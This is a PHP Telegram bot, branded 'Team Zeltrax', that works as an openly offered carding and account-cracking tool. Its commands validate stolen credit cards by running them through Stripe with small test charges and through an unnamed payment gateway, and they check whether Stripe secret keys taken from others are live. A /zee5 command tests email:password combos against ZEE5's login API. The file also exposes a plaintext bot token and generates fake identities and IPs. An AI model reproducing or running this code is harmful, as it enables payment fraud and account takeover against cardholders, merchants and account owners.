<?php

////////////////=============[Zeltrax Bot Raw]=============////////////////
////////==========[Join @ZeltraxRockz and @ZeltraxChat for more]==========////////

$botToken = "1120759678:AAHxI-9cIeBGMAAYcyENFCgnE1xDy7lXQWc"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}

//////////=========[Cmds Command]=========//////////

elseif (strpos($message, "/cmds") === 0){
sendMessage($chatId, "<u>Bin lookup:</u> <code>/bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>/sk</code> sk_live_TeamZeltrax%0A<u>Merchant CC Checker:</u> <code>/chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Web Based CC Checker:</u> <code>/schk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Zee5 Checker:</u> <code>/zee5</code> Email:Pass%0A<u>Info:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}

//////////=========[Info Command]=========//////////

elseif (strpos($message, "/info") === 0){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}

//////////=========[Bin Command]=========//////////

elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>', $message_id);
}

//////////=========[Chk Command]=========//////////

elseif (strpos($message, "/chk") === 0){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon   = $i[1];
$year  = $i[2];
$year1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mon = $separa[1];
$year = $separa[2];
$cvv = $separa[3];

$skeys = array(
  1 => 'Enter ur sk keys here', // Enter at least one sk key
//2 => 'Enter ur sk keys here',-----------------|
//3 => 'Enter ur sk keys here',                 | Uncomment this, if you want to add more sk keys :)
//4 => 'Enter ur sk keys here',                 |
//5 => 'Enter ur sk keys here',-----------------|
); 
$skey = array_rand($skeys);
$sk = $skeys[$skey];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
$f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$id = trim(strip_tags(GetStr($f,'"id": "','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
$result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$c = json_decode(curl_exec($ch), true);
curl_close($ch);
$pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
$cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
if ($c["status"] == "succeeded"){ 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
$result = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
$attachment_to_her = json_decode(curl_exec($ch), true);
curl_close($ch);
$attachment_to_her;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=100&currency=usd&customer='.$id.'');
$result = curl_exec($ch);
if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
$skresult = "APPROVED!";
$skresponse = "CVV MATCHES!";
}else{
$skresult = "UNCHECKED";
$skresponse = "UNAVAILABLE";
}}
elseif(strpos($result, '"cvc_check": "pass"')){
$skresult = "APPROVED!";
$skresponse = "OLD CVV!";
}
elseif(strpos($result, 'security code is incorrect')){
$skresult = "APPROVED!";
$skresponse = "CCN APPROVED!";
}
elseif (isset($c["error"])){
$skresult = "DECLINED!";
$skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
}else{
$skresult = "UNCHECKED";
$skresponse = "GATE FUCKED!";
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);

sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>'.$skresult.'</b>%0A<u>RESPONSE:</u> <b>'.$skresponse.'</b>%0A%0A----- BinData -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0AChecked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>', $message_id);
}

//////////=========[Conpay Command]=========//////////

elseif (strpos($message, "/conpay") === 0){
$lista = substr($message, 8);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon    = $i[1];
$year  = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
};

function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strlen($year) == 4){
$year = substr($year, 2);
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$first = ucfirst(str_shuffle('zeltrax'));
$last = ucfirst(str_shuffle('rockz'));
$com = ucfirst(str_shuffle('akash'));
$email = "zeltrax".substr(md5(uniqid()),0,8)."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$amount = "".rand(25,99)."";
$invoice = "".rand(111111,999999)."";
$ip = ''.rand(00,99).'.'.rand(000,999).'.'.rand(000,999).'.'.rand(00,99).''; // Your IP
$mip = ''.rand(00,99).'.'.rand(00,99).'.'.rand(000,999).'.'.rand(00,99).''; // Merchant IP
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$state = "New+York";
$zip = "10080";
$city = "New+York";
}
elseif ($state == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($state == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($state == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange+Park";
}else{
$state = "California";
$zip = "90201";
$city = "Bell";
};

//////////////////=================[Session ID]=================//////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '...........');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: ..............................',
'Accept-Language: .....................',
'Connection: ..........................',
'Host: ................................',
'Sec-Fetch-Dest: ......................',
'Sec-Fetch-Mode: ......................',
'Sec-Fetch-Site: ......................',
'Upgrade-Insecure-Requests: ...........'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$result1 = curl_exec($ch);
$session = string_between_two_string($result1, '<input type="hidden" name="sessionId" value="', '"/>');

//////////////////=================[Checking Cards]=================//////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '...........');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: ..............................',
'Accept-Language: .....................',
'Cache-Control: .......................',
'Connection: ..........................',
'Content-Type: ........................',
'Host: ................................',
'Origin: ..............................',
'Referer: .............................',
'Sec-Fetch-Dest: ......................',
'Sec-Fetch-Mode: ......................',
'Sec-Fetch-Site: ......................',
'Sec-Fetch-User: ......................',
'Upgrade-Insecure-Requests: ...........'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '.....$cc and $session will be used 2 times here.....');

/*

$session like this:

hdnfld_sessionId='.$session.'

sessionId='.$session.'
*/

/*

$cc like this:

ssl_account_data_original='.$cc.'

ssl_account_data='.$cc.'

*/

$result = curl_exec($ch);
$cvvres = string_between_two_string($result, '<input type="hidden" name="ssl_cvv2_response" value="', '"></td>');
$avsres = string_between_two_string($result, '<input type="hidden" name="ssl_avs_response" value="', '"></td>');
$msg = string_between_two_string($result, '<span id="ssl_result_message">', '</span>');

$gdAvs = array("A","B","D","G","P","S","X","Y","Z");
if(($cvvres == "M") && ((in_array($avsres, $gdAvs)) === true)){
$chStatus = "Yes";
}else{
$chStatus = "No";
};

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if($cvvres == "M"){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED [M] [$avsres]</b>%0A<b>Chargeable:</b> $chStatus%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}
elseif($cvvres == "N"){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED  [N] [$avsres]</b>%0A<b>Chargeable:</b> No%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}
elseif(!$result){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Response Not Loaded</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}else{
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u><b>Error Not listed  [$cvvres] [$avsres]</b>%0A<u>Message:</u><b>$msg</b>%0A<b>Chargeable:</b> $chStatus%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}

//////////=========[Schk (1req) Command]=========//////////

elseif (strpos($message, "/schk") === 0){
$lista = substr($message, 6);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon    = $i[1];
$year  = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '...........');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ...........',
'accept: ..............',
'accept-language: .....',
'content-Type: ........',
'origin: ..............',
'referer: .............',
'sec-fetch-mode: ......',
'sec-fetch-site: ......'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  '............');
$result = curl_exec($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($result, '"cvc_check": "pass"')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}
elseif (strpos($result, "incorrect_cvc")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}
elseif(!$result){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Response Not Loaded</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}else{
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u><b>Error Not listed</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}

//////////=========[Sk Key Check Command]=========//////////

elseif (strpos($message, "/sk") === 0){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
};}

//////////=========[Zee5 Command]=========//////////

elseif (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////===========[Login Check]============/////////////////////

$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));

/////////////////===============[Result]===========///////////////////

if($token){
sendMessage($chatId, "<b>ZEE5 Account:</b>%0A<u>Combo:</u> <code>$combo</code>%0A<u>Response:</u> <b>Successfully Logged in</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
}else{
sendMessage($chatId, "<u>Combo:</u> <code>$combo</code>%0A<u>Response:</u> <b>Wrong Email or Password</b>%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>", $message_id);
};
curl_close($ch);
ob_flush();
}

////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};

////////////////=============[Team Zeltrax]=============////////////////
////////==========[Join @ZeltraxRockz and @ZeltraxChat for more]==========////////

?>